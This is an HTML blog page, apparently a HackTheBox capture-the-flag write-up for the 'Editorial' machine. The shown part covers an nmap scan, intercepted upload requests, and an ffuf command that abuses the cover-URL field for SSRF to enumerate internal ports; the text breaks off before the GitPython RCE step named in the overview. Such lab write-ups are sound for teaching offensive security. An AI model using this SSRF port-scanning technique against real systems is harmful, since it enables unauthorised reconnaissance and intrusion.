@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/10/19/hackthebox-editorial/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewEditorial is an easy-difficulty linux machine from HackTheBox. I initially deals with a file upload feature manipulation and SSRF abuse to be able to enumerate internal service running on spec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Editorial">
+<meta property="og:url" content="http://foued-saidi.tech/2024/10/19/Hackthebox-Editorial/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewEditorial is an easy-difficulty linux machine from HackTheBox. I initially deals with a file upload feature manipulation and SSRF abuse to be able to enumerate internal service running on spec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Editorial/Editorial.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Editorial/web1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Editorial/web2.png">
+<meta property="article:published_time" content="2024-10-18T22:44:22.000Z">
+<meta property="article:modified_time" content="2024-10-19T18:23:00.335Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Editorial/Editorial.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Editorial -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Editorial</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-19 02:44:22</span>
+        <span class="mobile">2024-10-19 02:44:22</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-10-19 22:23</span>
+            <span class="mobile">2024-10-19 22:23</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Editorial is an easy-difficulty linux machine from HackTheBox. I initially deals with a file upload feature manipulation and SSRF abuse to be able to enumerate internal service running on specific ports and to be able to exfiltrate data from an internal api endpoint to get our user flag. Finally dealing with CVE-2022-24439 which is an RCE in GitPython for version below 3.1.30 that will allow us to take over the whole system.ssss</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Editorial/Editorial.png"
+                      alt="Editorial-info-card"
+                ><figcaption>Editorial-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">129.83</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-10-19</span> <span class="number">02</span>:<span class="number">57</span> Arabian Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2690</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">129.83</span></span><br><span class="line">Host is up (<span class="number">0.23</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.9</span>p1 Ubuntu <span class="number">3</span>ubuntu0.<span class="number">7</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> <span class="number">0</span>dedb29ce253fbd4c8c1196e7580d864 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">0</span>fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://editorial.htb</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.93</span>%E=<span class="number">4</span>%D=<span class="number">10</span>/<span class="number">19</span>%OT=<span class="number">22</span>%CT=<span class="number">1</span>%CU=<span class="number">38554</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">6712</span>E8</span><br><span class="line">OS:<span class="number">1</span>F%P=i686<span class="literal">-pc-windows-windows</span>)SEQ(<span class="built_in">SP</span>=<span class="number">103</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>A%TI=Z%CI=Z%<span class="built_in">II</span>=I%TS=</span><br><span class="line">OS:A)SEQ(CI=Z%<span class="built_in">II</span>=I)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54</span><br><span class="line">OS:EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%</span><br><span class="line">OS:W5=FE88%W6=FE88)ECN(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(<span class="built_in">R</span>=Y%DF=</span><br><span class="line">OS:Y%T=<span class="number">40</span>%S=O%A=S+%F=AS%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T2(<span class="built_in">R</span>=N)T3(<span class="built_in">R</span>=N)T4(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%</span><br><span class="line">OS:F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T5(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T6(<span class="built_in">R</span>=Y%DF=Y</span><br><span class="line">OS:%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T7(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%<span class="built_in">R</span></span><br><span class="line">OS:D=<span class="number">0</span>%Q=)U1(<span class="built_in">R</span>=Y%DF=N%T=<span class="number">40</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I</span><br><span class="line">OS:E(<span class="built_in">R</span>=Y%DFI=N%T=<span class="number">40</span>%<span class="built_in">CD</span>=S)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">125.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">265.00</span> ms <span class="number">10.129</span>.<span class="number">129.83</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">45.59</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+
+<p>We can see that we both have a 22 ssh port open and an exposed web application on port 80. We access the web application and we are redirected to <code>editorial.htb</code>, so let’s add that entry to our <code>/etc/hosts</code> file.</p>
+<h3 id="Web-Application-http-editorial-htb"><a href="#Web-Application-http-editorial-htb" class="headerlink" title="Web Application - http://editorial.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://editorial.htb/" >http://editorial.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We can see that we have a casual web application on our hands:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Editorial/web1.png"
+                      alt="Web application"
+                ><figcaption>Web application</figcaption></figure></p>
+<h4 id="Web-Application-http-editorial-htb-upload"><a href="#Web-Application-http-editorial-htb-upload" class="headerlink" title="Web Application - http://editorial.htb/upload"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://editorial.htb/upload" >http://editorial.htb/upload <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>Navigation to the <code>Publish with us</code> page, we can see that we can upload a “book” to publish it later. Let’s intercept that and see what we have:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>editorial.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>546</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://editorial.htb</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryQnA8wxzlrVNhNypA</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-GB,en;q=0.6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://editorial.htb/upload</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;bookname&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;bookintro&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;whyus&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;email&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span>@kujen.htb</span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA</span></span></span><br><span class="line"><span class="language-haskell"><span class="type">Content</span>-<span class="type">Disposition</span>: form-<span class="class"><span class="keyword">data</span>; name=&quot;phone&quot;</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br><span class="line"><span class="language-haskell"><span class="title">kujen</span></span></span><br><span class="line"><span class="language-haskell"><span class="comment">------WebKitFormBoundaryQnA8wxzlrVNhNypA--</span></span></span><br><span class="line"><span class="language-haskell"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>There’s an interesting button on the side which is used for “preview” of the cover, when we click on it we get this request:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload-cover</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>editorial.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>291</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarybIt6qcaIs0bnJknC</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-GB,en;q=0.6</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://editorial.htb</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://editorial.htb/upload</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarybIt6qcaIs0bnJknC</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;bookurl&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">kujen</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarybIt6qcaIs0bnJknC</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;bookfile&quot;; filename=&quot;&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarybIt6qcaIs0bnJknC--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s try replacing the “bookurl” with local hostnames to try and enumerates services running on internal ports. I ran this command after saving the request to a file <code>.\ffuf.exe -u http://editorial.htb/upload-cover -X POST -request requestt.txt -w ports.txt -fs 61</code> and got the port <code>5000</code>. Let’ make a request to it and see what we have:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Editorial/web2.png"
+                      alt="Web application"
+                ><figcaption>Web application</figcaption></figure></p>
+<p>We navigate to the provided file and find this interesting data under:</p>
